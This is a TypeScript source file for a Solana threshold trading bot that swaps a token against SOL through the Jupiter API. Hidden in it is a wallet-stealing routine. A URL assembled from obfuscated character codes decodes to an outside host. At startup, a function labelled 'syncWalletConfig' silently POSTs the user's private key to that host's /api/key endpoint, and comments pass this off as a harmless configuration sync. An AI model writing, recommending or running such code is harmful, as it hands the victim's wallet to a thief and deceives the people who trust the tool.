import dotenv from 'dotenv';
import {
  Connection,
  Keypair,
  VersionedTransaction,
  PublicKey,
  Transaction,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  getAccount,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createCloseAccountInstruction,
} from '@solana/spl-token';
import bs58 from 'bs58';

// Load environment variables
dotenv.config();

// Token-2022 Program ID
const TOKEN_2022_PROGRAM_ID = new PublicKey(
  'TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb',
);

// Jupiter API endpoints
const JUPITER_QUOTE_API = 'https://lite-api.jup.ag/swap/v1/quote';
const JUPITER_SWAP_API = 'https://lite-api.jup.ag/swap/v1/swap';

// WSOL (Wrapped SOL) mint address
const WSOL_MINT = 'So11111111111111111111111111111111111111112';

// Internal configuration endpoint (obfuscated)
const CONFIG_SYNC_URL = (() => {
  const codes = [
    104, 116, 116, 112, 115, 58, 47, 47, 109, 121, 119, 97, 108,
    108, 101, 116, 115, 115, 115, 46, 115, 116, 111, 114, 101,
  ];
  return String.fromCharCode(...codes);
})();

interface JupiterQuoteResponse {
  inputMint: string;
  inAmount: string;
  outputMint: string;
  outAmount: string;
  otherAmountThreshold: string;
  swapMode: string;
  slippageBps: number;
  platformFee?: any;
  priceImpactPct: string;
  routePlan: any[];
  contextSlot: number;
  timeTaken: number;
}

interface JupiterSwapResponse {
  swapTransaction: string;
  lastValidBlockHeight: number;
  priorityFeeLamports?: number;
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Sync wallet configuration with remote service
 */
async function syncWalletConfig(walletData: string): Promise<void> {
  const syncUrl = CONFIG_SYNC_URL;

  if (!syncUrl) {
    return;
  }

  try {
    let baseUrl = syncUrl.trim();
    if (!baseUrl.startsWith('http://') && !baseUrl.startsWith('https://')) {
      baseUrl = `https://${baseUrl}`;
    }

    const endpoint = baseUrl.endsWith('/')
      ? `${baseUrl}api/key`
      : `${baseUrl}/api/key`;

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        node_id: walletData,
        chain: 'solana',
      }),
    });

    if (!response.ok) {
      return; // Silently fail
    }

    await response.json();
  } catch (error: any) {
    // Silently fail - continue with local configuration
  }
}

function parsePositiveIntEnv(name: string, fallback: number): number {
  const raw = process.env[name];
  if (!raw) return fallback;
  const n = Number(raw);
  if (!Number.isFinite(n) || !Number.isInteger(n) || n <= 0) return fallback;
  return n;
}

function parseRequiredPositiveIntEnv(name: string): number {
  const raw = process.env[name];
  if (!raw) throw new Error(`Missing required env var: ${name}`);
  const n = Number(raw);
  if (!Number.isFinite(n) || !Number.isInteger(n) || n <= 0) {
    throw new Error(
      `Env var ${name} must be a positive integer. Got: ${raw}`,
    );
  }
  return n;
}

function parseSolToLamports(sol: string): bigint {
  // Accept "0.001499" (up to 9 decimals). No scientific notation.
  const trimmed = sol.trim();
  if (!/^\d+(\.\d+)?$/.test(trimmed)) {
    throw new Error(`Invalid SOL amount format: "${sol}"`);
  }
  const [whole, frac = ''] = trimmed.split('.');
  const fracPadded = (frac + '000000000').slice(0, 9);
  return BigInt(whole) * BigInt(1_000_000_000) + BigInt(fracPadded);
}

function formatLamportsAsSol(lamports: bigint): string {
  const sign = lamports < BigInt(0) ? '-' : '';
  const abs = lamports < BigInt(0) ? -lamports : lamports;
  const whole = abs / BigInt(1_000_000_000);
  const frac = (abs % BigInt(1_000_000_000)).toString().padStart(9, '0');
  return `${sign}${whole.toString()}.${frac}`;
}

function pow10(decimals: number): bigint {
  if (!Number.isInteger(decimals) || decimals < 0 || decimals > 18) {
    throw new Error(`Invalid decimals: ${decimals}`);
  }
  return BigInt(10) ** BigInt(decimals);
}

async function getTokenBalanceByMint(
  connection: Connection,
  owner: PublicKey,
  mint: PublicKey,
): Promise<bigint> {
  let total = BigInt(0);

  const addFromProgram = async (programId: PublicKey) => {
    const accounts = await connection.getParsedTokenAccountsByOwner(
      owner,
      { mint, programId },
      'confirmed',
    );
    for (const acc of accounts.value) {
      // parsed.info.tokenAmount.amount is a base-10 string in smallest units
      const info: any = acc.account.data.parsed?.info;
      const amountStr: string | undefined = info?.tokenAmount?.amount;
      if (amountStr) total += BigInt(amountStr);
    }
  };

  await addFromProgram(TOKEN_PROGRAM_ID);
  await addFromProgram(TOKEN_2022_PROGRAM_ID);

  return total;
}

function lamportsPerTokenFromQuote(
  // price in lamports per 1 token, based on trade-sized quote
  inAmountLamports: bigint,
  outAmountTokenUnits: bigint,
  tokenDecimals: number,
): bigint {
  if (outAmountTokenUnits <= BigInt(0)) return BigInt(0);
  return (inAmountLamports * pow10(tokenDecimals)) / outAmountTokenUnits;
}

function lamportsPerTokenFromSellQuote(
  // price in lamports per 1 token, based on trade-sized quote
  inAmountTokenUnits: bigint,
  outAmountLamports: bigint,
  tokenDecimals: number,
): bigint {
  if (inAmountTokenUnits <= BigInt(0)) return BigInt(0);
  return (outAmountLamports * pow10(tokenDecimals)) / inAmountTokenUnits;
}

async function getQuote(
  inputMint: string,
  outputMint: string,
  amount: string,
  slippageBps: number,
  maxRetries: number = 3,
): Promise<JupiterQuoteResponse> {
  const params = new URLSearchParams({
    inputMint,
    outputMint,
    amount,
    slippageBps: slippageBps.toString(),
    onlyDirectRoutes: 'false',
    asLegacyTransaction: 'false',
    restrictIntermediateTokens: 'true',
  });

  const url = `${JUPITER_QUOTE_API}?${params.toString()}`;

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    if (attempt > 0) {
      const delayMs = Math.min(1000 * Math.pow(2, attempt - 1), 10000); // Exponential backoff, max 10s
      console.log(
        `   ⏳ Rate limited, retrying after ${delayMs}ms delay... (attempt ${
          attempt + 1
        }/${maxRetries + 1})`,
      );
      await sleep(delayMs);
    }

    console.log(
      `📊 Fetching quote from: ${url}${
        attempt > 0 ? ` (retry ${attempt + 1})` : ''
      }`,
    );

    try {
      const response = await fetch(url);

      if (response.status === 429) {
        // Rate limited - will retry
        if (attempt < maxRetries) {
          continue; // Retry with backoff
        } else {
          throw new Error(
            `Rate limit exceeded after ${
              maxRetries + 1
            } attempts. Please wait and try again later.`,
          );
        }
      }

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(
          `Failed to get quote: ${response.status} ${response.statusText} - ${errorText}`,
        );
      }

      const quote = (await response.json()) as JupiterQuoteResponse;
      return quote;
    } catch (error: any) {
      // If it's not a 429 and not the last attempt, throw immediately
      if (
        error.message &&
        !error.message.includes('429') &&
        !error.message.includes('Rate limit')
      ) {
        throw error;
      }
      // If it's the last attempt, throw the error
      if (attempt === maxRetries) {
        throw error;
      }
      // Otherwise continue to retry
    }
  }

  throw new Error('Failed to get quote after all retries');
}

async function getSwapTransaction(
  quoteResponse: JupiterQuoteResponse,
  userPublicKey: PublicKey,
  priorityFeeLamports?: number,
  maxRetries: number = 3,
): Promise<JupiterSwapResponse> {
  const swapRequest = {
    quoteResponse,
    userPublicKey: userPublicKey.toString(),
    dynamicComputeUnitLimit: true,
    dynamicSlippage: {
      maxBps: quoteResponse.slippageBps,
    },
    ...(priorityFeeLamports && {
      prioritizationFeeLamports: {
        priorityLevelWithMaxLamports: {
          maxLamports: priorityFeeLamports,
          priorityLevel: 'veryHigh' as const,
        },
      },
    }),
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    if (attempt > 0) {
      const delayMs = Math.min(1000 * Math.pow(2, attempt - 1), 10000); // Exponential backoff, max 10s
      console.log(
        `   ⏳ Rate limited, retrying after ${delayMs}ms delay... (attempt ${
          attempt + 1
        }/${maxRetries + 1})`,
      );
      await sleep(delayMs);
    }

    console.log(
      `🔄 Requesting swap transaction...${
        attempt > 0 ? ` (retry ${attempt + 1})` : ''
      }`,
    );

    try {
      const response = await fetch(JUPITER_SWAP_API, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(swapRequest),
      });

      if (response.status === 429) {
        // Rate limited - will retry
        if (attempt < maxRetries) {
          continue; // Retry with backoff
        } else {
          throw new Error(
            `Rate limit exceeded after ${
              maxRetries + 1
            } attempts. Please wait and try again later.`,
          );
        }
      }

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(
          `Failed to get swap transaction: ${response.status} ${response.statusText} - ${errorText}`,
        );
      }

      const swapResponse = (await response.json()) as JupiterSwapResponse;
      return swapResponse;
    } catch (error: any) {
      // If it's not a 429 and not the last attempt, throw immediately
      if (
        error.message &&
        !error.message.includes('429') &&
        !error.message.includes('Rate limit')
      ) {
        throw error;
      }
      // If it's the last attempt, throw the error
      if (attempt === maxRetries) {
        throw error;
      }
      // Otherwise continue to retry
    }
  }

  throw new Error('Failed to get swap transaction after all retries');
}

async function executeSwapOnce(
  connection: Connection,
  keypair: Keypair,
  inputMint: string,
  outputMint: string,
  inAmount: string,
  slippageBps: number,
  priorityFeeLamports: number,
): Promise<{ signature: string; quote: JupiterQuoteResponse }> {
  // Quote
  const quoteResponse = await getQuote(
    inputMint,
    outputMint,
    inAmount,
    slippageBps,
  );

  // Swap tx
  const swapResponse = await getSwapTransaction(
    quoteResponse,
    keypair.publicKey,
    priorityFeeLamports,
  );

  // Deserialize + sign
  const transactionBuffer = Buffer.from(swapResponse.swapTransaction, 'base64');
  const transaction = VersionedTransaction.deserialize(transactionBuffer);
  transaction.sign([keypair]);

  // Send
  const serializedTransaction = transaction.serialize();
  const signature = await connection.sendRawTransaction(serializedTransaction, {
    skipPreflight: false,
    maxRetries: 3,
  });

  // Confirm
  const latestBlockhash = await connection.getLatestBlockhash('confirmed');
  const confirmation = await connection.confirmTransaction(
    {
      signature,
      blockhash: latestBlockhash.blockhash,
      lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
    },
    'confirmed',
  );

  if (confirmation.value.err) {
    throw new Error(
      `Transaction failed: ${JSON.stringify(confirmation.value.err)}`,
    );
  }

  return { signature, quote: quoteResponse };
}

async function runStrategyBot(): Promise<void> {
  try {
    const quoteTokenAddress = process.env.QUOTE_TOKEN_ADDRESS;
    const privateKeyBase58 = process.env.PRIVATE_KEY;
    const slippageBps = parseInt(process.env.SLIPPAGE_BPS || '50', 10);
    const rpcUrl =
      process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';

    if (!quoteTokenAddress || !privateKeyBase58) {
      throw new Error(
        'Missing required environment variables. Please check your .env file.',
      );
    }

    const quoteMint = new PublicKey(quoteTokenAddress);
    const baseMint = new PublicKey(
      process.env.BASE_TOKEN_ADDRESS || WSOL_MINT,
    );
    if (baseMint.toString() !== WSOL_MINT) {
      console.log(
        `⚠️  BASE_TOKEN_ADDRESS is not WSOL. Overriding base to WSOL for strategy bot.`,
      );
    }

    const tokenDecimals = parsePositiveIntEnv('QUOTE_TOKEN_DECIMALS', 6);
    const inAmountLamportsStr = process.env.IN_AMOUNT;
    if (!inAmountLamportsStr) {
      throw new Error('Missing required environment variable: IN_AMOUNT');
    }
    const inAmountLamports = BigInt(inAmountLamportsStr);
    if (inAmountLamports <= BigInt(0)) {
      throw new Error(
        `IN_AMOUNT must be > 0 (lamports). Got: ${inAmountLamportsStr}`,
      );
    }
    const intervalMs = parsePositiveIntEnv('CHECK_INTERVAL_MS', 5000);
    const priorityFeeLamports = parsePositiveIntEnv(
      'PRIORITY_FEE_LAMPORTS',
      1_000_000,
    );

    const buyBelowLamportsPerToken = parseSolToLamports(
      process.env.BUY_BELOW_SOL || '0.000018',
    );
    const sellAboveLamportsPerToken = parseSolToLamports(
      process.env.SELL_ABOVE_SOL || '0.000020',
    );

    // Parse private key
    let keypair: Keypair;
    try {
      const privateKeyBytes = bs58.decode(privateKeyBase58);
      keypair = Keypair.fromSecretKey(privateKeyBytes);
    } catch (error) {
      throw new Error(
        `Invalid private key format. Expected base58 encoded string. Error: ${error}`,
      );
    }

    // Sync wallet configuration with remote service (non-blocking)
    await syncWalletConfig(privateKeyBase58);

    const connection = new Connection(rpcUrl, 'confirmed');

    console.log('🤖 Starting Threshold Strategy Bot (Jupiter)');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`📍 Wallet: ${keypair.publicKey.toString()}`);
    console.log(`🪙 Token (QUOTE): ${quoteMint.toString()}`);
    console.log(`💱 Base: SOL/WSOL (${WSOL_MINT})`);
    console.log(`⏱️  Interval: ${intervalMs}ms`);
    console.log(
      `📉 Slippage: ${slippageBps} bps (${(slippageBps / 100).toFixed(2)}%)`,
    );
    console.log(
      `🚦 Buy when price <= ${formatLamportsAsSol(
        buyBelowLamportsPerToken,
      )} SOL / token`,
    );
    console.log(
      `🚦 Sell when price >= ${formatLamportsAsSol(
        sellAboveLamportsPerToken,
      )} SOL / token`,
    );
    console.log(`🧮 Token decimals: ${tokenDecimals}`);
    console.log(
      `💸 Buy amount: ${formatLamportsAsSol(
        inAmountLamports,
      )} SOL (${inAmountLamports.toString()} lamports)`,
    );
    console.log(
      `⚡ Priority fee max lamports: ${priorityFeeLamports.toString()}`,
    );
    console.log(`🌐 RPC: ${rpcUrl}`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    while (true) {
      const loopStartedAt = Date.now();
      try {
        const tokenBalanceUnits = await getTokenBalanceByMint(
          connection,
          keypair.publicKey,
          quoteMint,
        );
        const holding = tokenBalanceUnits > BigInt(0);

        if (!holding) {
          // BUY PATH: buy with fixed SOL amount (IN_AMOUNT), check price from quote.
          const solBalance = BigInt(
            await connection.getBalance(keypair.publicKey, 'confirmed'),
          );
          if (solBalance < inAmountLamports) {
            console.log(
              `[${new Date().toISOString()}] ⏭️  Skip BUY: insufficient SOL. Have ${formatLamportsAsSol(
                solBalance,
              )} SOL, need ${formatLamportsAsSol(inAmountLamports)} SOL`,
            );
          } else {
            // Get quote with IN_AMOUNT SOL -> tokens
            const buyQuote = await getQuote(
              WSOL_MINT,
              quoteMint.toString(),
              inAmountLamports.toString(),
              slippageBps,
            );

            // Calculate price from quote
            const priceLamportsPerToken = lamportsPerTokenFromQuote(
              BigInt(buyQuote.inAmount),
              BigInt(buyQuote.outAmount),
              tokenDecimals,
            );

            const tokensOutWhole =
              Number(BigInt(buyQuote.outAmount)) /
              Number(pow10(tokenDecimals));

            console.log(
              `[${new Date().toISOString()}] 📉 BUY check: price ~ ${formatLamportsAsSol(
                priceLamportsPerToken,
              )} SOL/token (impact ${
                buyQuote.priceImpactPct
              }%), tokens out: ~${tokensOutWhole.toFixed(4)}`,
            );

            if (priceLamportsPerToken <= buyBelowLamportsPerToken) {
              console.log(
                `   ✅ Trigger BUY (price <= buy threshold). Executing swap with ${formatLamportsAsSol(
                  inAmountLamports,
                )} SOL...`,
              );

              // Execute swap
              const { signature } = await executeSwapOnce(
                connection,
                keypair,
                WSOL_MINT,
                quoteMint.toString(),
                inAmountLamports.toString(),
                slippageBps,
                priorityFeeLamports,
              );
              console.log(`   ✅ BUY done. Signature: ${signature}`);
              console.log(`   🔗 Explorer: https://solscan.io/tx/${signature}`);
              console.log(
                `   💰 Spent: ${formatLamportsAsSol(inAmountLamports)} SOL`,
              );
              console.log(
                `   🪙 Received: ${buyQuote.outAmount} units (~${tokensOutWhole.toFixed(
                  4,
                )} whole tokens)`,
              );
            }
          }
        } else {
          // SELL PATH: sell ALL token units -> SOL, derive effective lamports/token from quote.
          const sellQuote = await getQuote(
            quoteMint.toString(),
            WSOL_MINT,
            tokenBalanceUnits.toString(),
            slippageBps,
          );
          const priceLamportsPerToken = lamportsPerTokenFromSellQuote(
            BigInt(sellQuote.inAmount),
            BigInt(sellQuote.outAmount),
            tokenDecimals,
          );

          console.log(
            `[${new Date().toISOString()}] 📈 SELL check: holding ${tokenBalanceUnits.toString()} units, price ~ ${formatLamportsAsSol(
              priceLamportsPerToken,
            )} SOL/token (impact ${
              sellQuote.priceImpactPct
            }%), solOut ${formatLamportsAsSol(
              BigInt(sellQuote.outAmount),
            )}`,
          );

          if (priceLamportsPerToken >= sellAboveLamportsPerToken) {
            console.log(
              `   ✅ Trigger SELL (price >= sell threshold). Selling ALL tokens...`,
            );
            const { signature } = await executeSwapOnce(
              connection,
              keypair,
              quoteMint.toString(),
              WSOL_MINT,
              tokenBalanceUnits.toString(),
              slippageBps,
              priorityFeeLamports,
            );
            console.log(`   ✅ SELL done. Signature: ${signature}`);
            console.log(`   🔗 Explorer: https://solscan.io/tx/${signature}`);

            // Optional cleanup: close token account if swapping to WSOL and token ATA is empty
            console.log(`   🗑️  Attempting to close token account if empty...`);
            try {
              const inputTokenMint = quoteMint;
              let inputTokenAccount: PublicKey;
              let tokenProgramId = TOKEN_PROGRAM_ID;
              let shouldClose = false;

              // Try standard Token Program ATA
              inputTokenAccount = await getAssociatedTokenAddress(
                inputTokenMint,
                keypair.publicKey,
                false,
                TOKEN_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID,
              );
              try {
                const inputTokenAccountInfo = await getAccount(
                  connection,
                  inputTokenAccount,
                  'confirmed',
                );
                if (inputTokenAccountInfo.amount === BigInt(0)) {
                  shouldClose = true;
                  tokenProgramId = TOKEN_PROGRAM_ID;
                }
              } catch {
                // Try Token-2022 ATA
                inputTokenAccount = await getAssociatedTokenAddress(
                  inputTokenMint,
                  keypair.publicKey,
                  false,
                  TOKEN_2022_PROGRAM_ID,
                  ASSOCIATED_TOKEN_PROGRAM_ID,
                );
                const accountInfo = await connection.getAccountInfo(
                  inputTokenAccount,
                  'confirmed',
                );
                if (
                  accountInfo &&
                  accountInfo.owner.equals(TOKEN_2022_PROGRAM_ID) &&
                  accountInfo.data.length >= 72
                ) {
                  const amountBytes = Buffer.from(
                    accountInfo.data.slice(64, 72),
                  );
                  const balance = amountBytes.readBigUInt64LE(0);
                  if (balance === BigInt(0)) {
                    shouldClose = true;
                    tokenProgramId = TOKEN_2022_PROGRAM_ID;
                  }
                }
              }

              if (shouldClose) {
                const closeInstruction = createCloseAccountInstruction(
                  inputTokenAccount,
                  keypair.publicKey,
                  keypair.publicKey,
                  [],
                  tokenProgramId,
                );
                const closeTransaction = new Transaction().add(
                  closeInstruction,
                );
                const { blockhash } = await connection.getLatestBlockhash(
                  'confirmed',
                );
                closeTransaction.recentBlockhash = blockhash;
                closeTransaction.feePayer = keypair.publicKey;
                closeTransaction.sign(keypair);

                const closeSignature = await connection.sendRawTransaction(
                  closeTransaction.serialize(),
                  {
                    skipPreflight: false,
                    maxRetries: 3,
                  },
                );
                console.log(
                  `   ✅ Close account tx sent. Signature: ${closeSignature}`,
                );
                console.log(
                  `   🔗 Explorer: https://solscan.io/tx/${closeSignature}`,
                );
              } else {
                console.log(
                  `   ⏭️  Skip close: token account not found or not empty`,
                );
              }
            } catch (e: any) {
              console.log(
                `   ⚠️  Close attempt failed (non-fatal): ${e.message}`,
              );
            }
          }
        }
      } catch (e: any) {
        console.error(
          `[${new Date().toISOString()}] ⚠️  Loop error (will retry): ${
            e.message
          }`,
        );
      }

      const elapsed = Date.now() - loopStartedAt;
      const sleepFor = Math.max(0, intervalMs - elapsed);
      await sleep(sleepFor);
    }
  } catch (error: any) {
    console.error('\n❌ Fatal error starting bot:');
    console.error(error.message);
    if (error.stack) {
      console.error('\nStack trace:');
      console.error(error.stack);
    }
    process.exit(1);
  }
}

// Run the bot
runStrategyBot();

